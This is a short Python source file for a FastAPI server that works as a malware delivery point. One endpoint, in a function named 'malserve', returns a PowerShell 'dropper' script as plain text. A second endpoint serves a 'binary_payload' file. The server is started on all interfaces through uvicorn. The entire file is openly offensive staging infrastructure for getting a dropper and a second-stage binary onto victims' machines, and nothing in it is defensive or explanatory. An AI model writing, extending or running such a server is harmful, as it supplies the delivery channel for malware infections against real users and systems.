from fastapi import FastAPI

from fastapi.responses import Response,FileResponse


import config

app = FastAPI()



@app.get(f"{config.dropperEndpoint}")
def malserve():
    with open(config.conf["PATHS"]["dropper"],"r",encoding="utf-8") as powershellscript:
        PSCode = powershellscript.read()
    return Response(
        content=PSCode,
        media_type="text/plain"
    )

@app.get(f"{config.binEndpoint}")
def serveBin():
    return FileResponse(
        config.conf["PATHS"]["binary_payload"]
    )
if __name__ == "__main__":
    import os
    from colorama import init
    init()
    os.system(f"uvicorn {config.main_script.replace(".py","")}:app --host 0.0.0.0 --port {config.deliveryServerPort} --reload")
